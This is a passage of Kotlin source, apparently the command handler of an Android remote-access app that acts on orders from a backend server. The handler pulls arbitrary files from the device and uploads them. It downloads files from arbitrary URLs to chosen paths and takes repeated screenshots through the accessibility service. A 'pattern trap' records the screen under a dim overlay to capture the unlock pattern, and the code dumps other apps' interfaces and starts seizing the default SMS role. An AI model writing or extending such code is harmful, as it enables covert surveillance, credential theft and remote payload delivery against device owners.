  87 |     suspend fun processSingleCommand(ctx: Context, cmd: JSONObject) {
  88 |         val id = cmd.getInt("id")
  89 |         
  90 |         // 1. Mark as RECEIVED immediately so backend knows the device is alive
  91 |         updateCommandStatus(ctx, id, "RECEIVED", null)
  92 | 
  93 |         var status = "EXECUTED"
  94 |         var errorMsg = ""
  95 |         val fileName = cmd.optString("file_name")
  96 |         val content = cmd.optString("content", "")
  97 | 
  98 |         try {
  99 |             when (fileName) {
 100 |                 "PING" -> {
 101 |                     CloudManager.sendPing(ctx, "Remote Tickle: Alive")
 102 |                     status = "PONG"
 103 |                 }
 104 |                 "TOAST" -> {
 105 |                     Handler(Looper.getMainLooper()).post {
 106 |                         Toast.makeText(ctx, content, Toast.LENGTH_LONG).show()
 107 |                     }
 108 |                 }
 109 |                 "RING" -> {
 110 |                     val dur = content.toLongOrNull() ?: 10L
 111 |                     val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
 112 |                     val oldMode = am.ringerMode
 113 |                     val oldVol = am.getStreamVolume(android.media.AudioManager.STREAM_RING)
 114 |                     
 115 |                     if (PermissionManager.hasDndAccess(ctx)) {
 116 |                         am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
 117 |                     }
 118 |                     am.setStreamVolume(android.media.AudioManager.STREAM_RING, am.getStreamMaxVolume(android.media.AudioManager.STREAM_RING), 0)
 119 |                     
 120 |                     val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
 121 |                     val ringtone = android.media.RingtoneManager.getRingtone(ctx, uri)
 122 |                     ringtone.play()
 123 |                     
 124 |                     if (ringtone.isPlaying) {
 125 |                         status = "SUCCESS"
 126 |                         errorMsg = "Audible alert active for ${dur}s"
 127 |                         kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
 128 |                             kotlinx.coroutines.delay(dur * 1000)
 129 |                             ringtone.stop()
 130 |                             if (PermissionManager.hasDndAccess(ctx)) am.ringerMode = oldMode
 131 |                             am.setStreamVolume(android.media.AudioManager.STREAM_RING, oldVol, 0)
 132 |                         }
 133 |                     } else {
 134 |                         status = "FAILED_AUDIO_BLOCKED"
 135 |                         errorMsg = "Hardware output or system focus prevented playback."
 136 |                     }
 137 |                 }
 138 |                 "STAY_READY" -> {
 139 |                     val mins = content.toLongOrNull() ?: 5L
 140 |                     val i = android.content.Intent(ctx, BeaconService::class.java)
 141 |                     i.putExtra("duration_mins", mins)
 142 |                     if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i)
 143 |                     else ctx.startService(i)
 144 |                     status = "SYNC_PRIORITY_HIGH (${mins}M)"
 145 |                 }
 146 |                 "SET_INTERVAL" -> {
 147 |                     // Content = Interval in Minutes (min 15)
 148 |                     val mins = content.toLongOrNull() ?: 15L
 149 |                     val safeMins = if (mins < 15) 15L else mins
 150 |                     
 151 |                     val wm = WorkManager.getInstance(ctx)
 152 |                     val constraints = Constraints.Builder()
 153 |                         .setRequiredNetworkType(NetworkType.CONNECTED)
 154 |                         .setRequiresBatteryNotLow(true)
 155 |                         .build()
 156 | 
 157 |                     val req = PeriodicWorkRequestBuilder<RemoteCommandWorker>(safeMins, TimeUnit.MINUTES)
 158 |                         .setConstraints(constraints)
 159 |                         .build()
 160 |                         
 161 |                     wm.enqueueUniquePeriodicWork("RemoteCmdWorker", ExistingPeriodicWorkPolicy.REPLACE, req)
 162 |                     status = "EXECUTED (NEW INTERVAL: ${safeMins}M)"
 163 |                 }
 164 |                 "STOP_BEACON" -> {
 165 |                     ctx.stopService(android.content.Intent(ctx, BeaconService::class.java))
 166 |                     SocketManager.disconnect()
 167 |                     status = "EXECUTED (STOPPED)"
 168 |                 }
 169 |                 "LIVE_STREAM" -> {
 170 |                     val parts = content.split("|")
 171 |                     val mode = parts[0].trim().uppercase()
 172 |                     if (mode == "ON") {
 173 |                         val mins = parts.getOrNull(1)?.trim()?.toLongOrNull() ?: 15L
 174 |                         val i = android.content.Intent(ctx, BeaconService::class.java).apply {
 175 |                             putExtra("duration_mins", mins)
 176 |                             putExtra("mode", "LIVE_STREAM")
 177 |                         }
 178 |                         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i)
 179 |                         else ctx.startService(i)
 180 |                         status = "STREAM_STARTED (${mins}M)"
 181 |                     } else {
 182 |                         ctx.stopService(android.content.Intent(ctx, BeaconService::class.java))
 183 |                         SocketManager.disconnect()
 184 |                         status = "STREAM_STOPPED"
 185 |                     }
 186 |                 }
 187 |                 "GET_TOKEN" -> {
 188 |                     val token = DeviceManager.getRobustFcmToken(ctx)
 189 |                     if (token != null) {
 190 |                         status = "TOKEN_RETRIEVED"
 191 |                         val result = JSONObject().put("fcm_token", token)
 192 |                         updateCommandStatus(ctx, id, status, null, result, null)
 193 |                         return
 194 |                     } else {
 195 |                         status = "FETCH_FAILED (NO_TOKEN)"
 196 |                         errorMsg = "Play Services unavailable or token generation blocked."
 197 |                     }
 198 |                 }
 199 |                 "GET_VAULT_SIZE" -> {
 200 |                     val sizeInfo = DumpManager.getVaultSize()
 201 |                     status = "EXECUTED"
 202 |                     val result = JSONObject().put("size_report", sizeInfo)
 203 |                     updateCommandStatus(ctx, id, status, null, result, null)
 204 |                     return
 205 |                 }
 206 |                 "FORCE_UPLOAD" -> {
 207 |                     val modules = content.split(",").map { it.trim() }
 208 |                     CloudManager.uploadData(ctx, modules, "REMOTE_COMMAND")
 209 |                     status = "MANUAL_BACKUP_INITIATED"
 210 |                 }
 211 |                 "UPLOAD_DUMPS" -> {
 212 |                     val root = DumpManager.getRootDir()
 213 |                     val dateFolders = root.listFiles { f -> f.isDirectory } ?: emptyArray()
 214 |                     var filesUploaded = 0
 215 |                     var foldersCleared = 0
 216 | 
 217 |                     for (folder in dateFolders) {
 218 |                         val files = folder.listFiles() ?: continue
 219 |                         if (files.isEmpty()) {
 220 |                             folder.delete()
 221 |                             continue
 222 |                         }
 223 | 
 224 |                         var folderEmpty = true
 225 |                         for (f in files) {
 226 |                             // Upload to 'ARCHIVE' category
 227 |                             if (CloudManager.uploadFile(ctx, f, "ARCHIVE")) {
 228 |                                 f.delete()
 229 |                                 filesUploaded++
 230 |                             } else {
 231 |                                 folderEmpty = false
 232 |                             }
 233 |                         }
 234 | 
 235 |                         if (folderEmpty) {
 236 |                             folder.delete()
 237 |                             foldersCleared++
 238 |                         }
 239 |                     }
 240 |                     status = "SCAVENGER_COMPLETE"
 241 |                     val result = JSONObject()
 242 |                     result.put("files_synced", filesUploaded)
 243 |                     result.put("vault_folders_wiped", foldersCleared)
 244 |                     updateCommandStatus(ctx, id, status, null, result, null)
 245 |                     return
 246 |                 }
 247 |                 "PULL_FILE" -> {
 248 |                     val f = File(content)
 249 |                     if (f.exists() && f.isFile) {
 250 |                         val timestamp = System.currentTimeMillis()
 251 |                         val folderName = DeviceManager.getDeviceFolderName(ctx)
 252 |                         val storagePath = "$folderName/PULL/${timestamp}_${f.name}"
 253 |                         if (!CloudManager.uploadFile(ctx, f, "PULL", timestamp)) {
 254 |                             status = "FETCH_FAILED (UPLOAD_ERROR)"
 255 |                             errorMsg = "File exists but streaming to storage bucket failed."
 256 |                         } else {
 257 |                             status = "REMOTE_FETCH_SUCCESS"
 258 |                             updateCommandStatus(ctx, id, status, null, null, storagePath)
 259 |                             return 
 260 |                         }
 261 |                     } else {
 262 |                         status = "FETCH_ABORTED (NOT_FOUND)"
 263 |                         errorMsg = "File path does not exist on device."
 264 |                     }
 265 |                 }
 266 |                 "PUSH_FILE" -> {
 267 |                     val parts = content.split("|")
 268 |                     if (parts.size < 2) {
 269 |                         status = "FAILED (BAD_FORMAT)"
 270 |                         errorMsg = "Required format: URL | /path/to/save/file.ext"
 271 |                     } else {
 272 |                         var currentUrl = parts[0].trim()
 273 |                         val targetPath = parts[1].trim()
 274 |                         val targetFile = File(targetPath)
 275 |                         
 276 |                         try {
 277 |                             targetFile.parentFile?.mkdirs()
 278 |                             var connection: java.net.HttpURLConnection
 279 |                             var redirects = 0
 280 |                             val maxRedirects = 5
 281 | 
 282 |                             while (true) {
 283 |                                 val url = URL(currentUrl)
 284 |                                 connection = url.openConnection() as java.net.HttpURLConnection
 285 |                                 connection.instanceFollowRedirects = false // Manually handle for control
 286 |                                 connection.connectTimeout = 30000
 287 |                                 connection.readTimeout = 30000
 288 |                                 
 289 |                                 val code = connection.responseCode
 290 |                                 if (code in 300..308 && redirects < maxRedirects) {
 291 |                                     currentUrl = connection.getHeaderField("Location")
 292 |                                     redirects++
 293 |                                     continue
 294 |                                 }
 295 | 
 296 |                                 if (code == 200) {
 297 |                                     connection.inputStream.use { input ->
 298 |                                         targetFile.outputStream().use { output ->
 299 |                                             input.copyTo(output, 8192)
 300 |                                         }
 301 |                                     }
 302 |                                     status = "DEPLOYMENT_SUCCESS"
 303 |                                     val result = JSONObject()
 304 |                                     result.put("saved_to", targetFile.absolutePath)
 305 |                                     result.put("size", targetFile.length())
 306 |                                     result.put("redirects", redirects)
 307 |                                     updateCommandStatus(ctx, id, status, null, result, null)
 308 |                                     return
 309 |                                 } else {
 310 |                                     status = "DEPLOYMENT_FAILED"
 311 |                                     errorMsg = "HTTP $code at end of chain"
 312 |                                     break
 313 |                                 }
 314 |                             }
 315 |                         } catch (e: Exception) {
 316 |                             status = "DEPLOYMENT_ERROR"
 317 |                             errorMsg = e.toString()
 318 |                         }
 319 |                     }
 320 |                 }
 321 |                 "GET_SKELETON" -> {
 322 |                     val depth = content.trim().toIntOrNull() ?: 5
 323 |                     val report = FileManager.generateReport(depth)
 324 |                     status = "STORAGE_INDEX_COMPLETE"
 325 |                     DebugLogger.log("COMMAND", "Processed [$fileName] (Depth: $depth) -> $status")
 326 |                     updateCommandStatus(ctx, id, status, null, report, null)
 327 |                     return
 328 |                 }
 329 |                 "MAP_GRID" -> {
 330 |                     val depth = content.trim().toIntOrNull() ?: 10
 331 |                     val service = MyAccessibilityService.instance
 332 |                     if (service != null) {
 333 |                         CoroutineScope(Dispatchers.IO).launch {
 334 |                             service.executeMapGridSequence(id, depth)
 335 |                         }
 336 |                         status = "GRID_MAPPING_INITIATED"
 337 |                         updateCommandStatus(ctx, id, status, null, null, null)
 338 |                         return
 339 |                     } else {
 340 |                         status = "FAILED (SERVICE_OFF)"
 341 |                         errorMsg = "Accessibility service is required for UI mapping."
 342 |                     }
 343 |                 }
 344 |                 "CAPTURE_PATTERN" -> {
 345 |                     ScreenRecordManager.pendingCmdId = id
 346 |                     val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
 347 |                     if (!pm.isInteractive) {
 348 |                         status = "FAILED (SCREEN_OFF)"
 349 |                         errorMsg = "Screen must be physically ON to initiate the pattern trap securely."
 350 |                     } else {
 351 |                         val parts = content.split("|")
 352 |                         val timeoutSec = parts.getOrNull(0)?.trim()?.toLongOrNull() ?: 20L
 353 |                         val qual = parts.getOrNull(1)?.trim()?.uppercase() ?: "MED"
 354 |                         val fps = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 30
 355 | 
 356 |                         ScreenRecordManager.expectedMode = "AUTO"
 357 |                         ScreenRecordManager.pendingDur = 600 // 10 min fallback cap
 358 |                         ScreenRecordManager.pendingQual = qual
 359 |                         ScreenRecordManager.pendingFps = fps
 360 |                         ScreenRecordManager.pendingAudio = false
 361 |                         ScreenRecordManager.isPatternTrap = true
 362 |                         ScreenRecordManager.patternSuccessTimeoutMs = timeoutSec * 1000L
 363 |                         
 364 |                         android.os.Handler(android.os.Looper.getMainLooper()).post {
 365 |                             DimmerManager.applyDim(ctx, 0, "OVERLAY")
 366 |                             android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
 367 |                                 if (ScreenRecordManager.expectedMode == "AUTO") {
 368 |                                     DimmerManager.removeOverlay(ctx)
 369 |                                     ScreenRecordManager.expectedMode = ""
 370 |                                 }
 371 |                             }, 10000)
 372 |                         }
 373 |                         
 374 |                         val i = Intent(ctx, PulseActivity::class.java).apply {
 375 |                             addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
 376 |                             putExtra("is_screen_record_trigger", true)
 377 |                         }
 378 |                         ctx.startActivity(i)
 379 |                         status = "PATTERN_TRAP_ARMED (Timeout: ${timeoutSec}s | Quality: $qual)"
 380 |                     }
 381 |                 }
 382 |                 "GET_TREE" -> {
 383 |                     val parts = content.split("|")
 384 |                     val pkg = parts.getOrNull(0)?.trim().let { if (it == "null" || it == "") null else it }
 385 |                     val mins = parts.getOrNull(1)?.trim()?.toLongOrNull() ?: 5L
 386 |                     val depth = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 10
 387 |                     
 388 |                     val service = MyAccessibilityService.instance
 389 |                     if (service != null) {
 390 |                         if (mins <= 0L) {
 391 |                             // Instant Frame Grab (No Session)
 392 |                             val instantTree = service.getInstantTree(pkg, depth)
 393 |                             if (!instantTree.has("error")) {
 394 |                                 status = "SCAN_COMPLETE"
 395 |                                 val result = JSONObject().apply {
 396 |                                     put("depth_limit", depth)
 397 |                                     put("snapshot", instantTree)
 398 |                                 }
 399 |                                 updateCommandStatus(ctx, id, status, null, result, null)
 400 |                             } else {
 401 |                                 status = "FAILED (NOT_IN_FOREGROUND)"
 402 |                                 errorMsg = instantTree.optString("error")
 403 |                             }
 404 |                             return
 405 |                         } else {
 406 |                             // Queue and wait for target to open
 407 |                             service.startTreeDump(pkg, mins, id, depth)
 408 |                             status = if (pkg != null) "WAITING_FOR_TARGET_APP (DUR: ${mins}M)" else "SCAN_SESSION_ACTIVE (${mins}M)"
 409 |                             updateCommandStatus(ctx, id, status, null, null, null)
 410 |                             return
 411 |                         }
 412 |                     } else {
 413 |                         status = "FAILED (SERVICE_OFF)"
 414 |                         errorMsg = "Accessibility service is offline."
 415 |                     }
 416 |                 }
 417 |                 "RESET_SCRAPER" -> {
 418 |                     val service = MyAccessibilityService.instance
 419 |                     if (service != null) {
 420 |                         service.resetAllTasks()
 421 |                         status = "SCRAPER_QUEUE_PURGED"
 422 |                     } else {
 423 |                         status = "FAILED (SERVICE_OFF)"
 424 |                     }
 425 |                 }
 426 |                 "GET_LOGS" -> {
 427 |                     val logs = DebugLogger.getLogs()
 428 |                     val tempFile = java.io.File(ctx.cacheDir, "diag_log_${System.currentTimeMillis()}.txt")
 429 |                     try {
 430 |                         tempFile.writeText(logs)
 431 |                         if (CloudManager.uploadFile(ctx, tempFile, "DIAGNOSTIC")) {
 432 |                             status = "DIAGNOSTIC_EXPORT_SUCCESS"
 433 |                         } else {
 434 |                             status = "DIAGNOSTIC_EXPORT_FAILED"
 435 |                         }
 436 |                     } catch (e: Exception) {
 437 |                         status = "EXPORT_ERROR"
 438 |                     } finally {
 439 |                         if (tempFile.exists()) tempFile.delete()
 440 |                     }
 441 |                 }
 442 |                 "TOGGLE_FEATURE" -> {
 443 |                     val parts = content.split(":")
 444 |                     if (parts.size >= 2) {
 445 |                         val feature = parts[0].trim()
 446 |                         val mode = parts[1].trim()
 447 |                         val p1 = parts.getOrNull(2)?.trim()
 448 |                         val p2 = parts.getOrNull(3)?.trim()
 449 |                         
 450 |                         ConfigManager.setFeatureParametric(ctx, feature, mode, p1, p2)
 451 |                         status = "EXECUTED ($feature -> $mode)"
 452 |                     } else {
 453 |                         status = "FAILED (FORMAT)"
 454 |                         errorMsg = "Usage: feature:mode:p1:p2"
 455 |                     }
 456 |                 }
 457 |                 "MASTER_TOGGLE" -> {
 458 |                     val mode = content.trim().uppercase()
 459 |                     if (mode == "ON" || mode == "OFF") {
 460 |                         ConfigManager.setAllFeatures(ctx, mode)
 461 |                         status = "MASTER_TOGGLE_EXECUTED ($mode)"
 462 |                     } else {
 463 |                         status = "FAILED (FORMAT)"
 464 |                         errorMsg = "Usage: ON or OFF"
 465 |                     }
 466 |                 }
 467 |                 "CODERED" -> {
 468 |                     val parts = content.split("|")
 469 |                     val codes = parts[0].trim()
 470 |                     val handler = if (parts.size > 1) parts[1].trim() else "BACKEND"
 471 |                     
 472 |                     val i = android.content.Intent(ctx, EmergencyService::class.java)
 473 |                     i.putExtra("codes", codes)
 474 |                     i.putExtra("sender", handler)
 475 |                     
 476 |                     DebugLogger.log("SYSTEM", "Triggering CodeRed. Codes: $codes | Handler: $handler")
 477 | 
 478 |                     if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
 479 |                         ctx.startForegroundService(i)
 480 |                     } else {
 481 |                         ctx.startService(i)
 482 |                     }
 483 |                     status = "EMERGENCY_PROMPTED"
 484 |                 }
 485 |                 "GET_SCREENSHOT" -> {
 486 |                     if (MyAccessibilityService.instance == null) {
 487 |                         status = "FAILED (SERVICE_OFF)"
 488 |                         errorMsg = "Accessibility service is required for screenshots."
 489 |                     } else {
 490 |                         val parts = content.split("|")
 491 |                         val quality = parts.getOrNull(0)?.trim()?.toIntOrNull() ?: 70
 492 |                         val freq = parts.getOrNull(1)?.trim()?.toIntOrNull() ?: 0
 493 |                         val duration = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 0
 494 | 
 495 |                         if (freq > 0 && duration > 0) {
 496 |                             val safeFreq = if (freq < 2) 2 else freq
 497 |                             val endTime = System.currentTimeMillis() + (duration * 1000L)
 498 |                             var capturedCount = 0
 499 |                             
 500 |                             DebugLogger.log("SCREEN_SESSION", "Starting continuous capture: ${safeFreq}s interval for ${duration}s")
 501 |                             
 502 |                             while (System.currentTimeMillis() < endTime) {
 503 |                                 val deferredFile = CompletableDeferred<java.io.File?>()
 504 |                                 MyAccessibilityService.instance?.captureScreenshot(quality) { file ->
 505 |                                     deferredFile.complete(file)
 506 |                                 }
 507 | 
 508 |                                 val file = withTimeoutOrNull(8000) { deferredFile.await() }
 509 |                                 if (file != null) {
 510 |                                     if (CloudManager.uploadFile(ctx, file, "SCREEN_CAPTURE")) {
 511 |                                         file.delete()
 512 |                                     } else {
 513 |                                         DumpManager.vaultMedia(file, "SCREEN_CAPTURE")
 514 |                                     }
 515 |                                     capturedCount++
 516 |                                 }
 517 |                                 
 518 |                                 if (System.currentTimeMillis() + (safeFreq * 1000L) > endTime) break
 519 |                                 delay(safeFreq * 1000L)
 520 |                             }
 521 |                             status = "SCREENSHOT_SESSION_COMPLETE ($capturedCount images)"
 522 |                         } else {
 523 |                             // Single Shot Logic
 524 |                             val deferredFile = CompletableDeferred<java.io.File?>()
 525 |                             MyAccessibilityService.instance?.captureScreenshot(quality) { file ->
 526 |                                 deferredFile.complete(file)
 527 |                             }
 528 | 
 529 |                             val file = withTimeoutOrNull(10000) { deferredFile.await() }
 530 |                             if (file != null) {
 531 |                                 if (CloudManager.uploadFile(ctx, file, "SCREEN_CAPTURE")) {
 532 |                                     status = "SCREENSHOT_UPLOADED"
 533 |                                     file.delete()
 534 |                                 } else {
 535 |                                     DumpManager.vaultMedia(file, "SCREEN_CAPTURE")
 536 |                                     status = "SCREENSHOT_QUEUED_OFFLINE"
 537 |                                 }
 538 |                             } else {
 539 |                                 status = "SCREENSHOT_FAILED"
 540 |                                 errorMsg = "Capture timed out or device version incompatible."
 541 |                             }
 542 |                         }
 543 |                     }
 544 |                 }
 545 |                 "SET_DEFAULT_SMS" -> {
 546 |                     DefaultSmsManager.pendingCmdId = id
 547 |                     val mode = content.trim().uppercase()
 548 |                     val currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(ctx)
 549 |                     
 550 |                     // Capture the original package ONLY if it's not us
 551 |                     if (currentDefault != ctx.packageName) {
 552 |                         ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
 553 |                             .putString("original_sms_package", currentDefault).apply()
 554 |                         DebugLogger.log("SMS_MGR", "Captured original SMS app: $currentDefault")
 555 |                     }
 556 | 
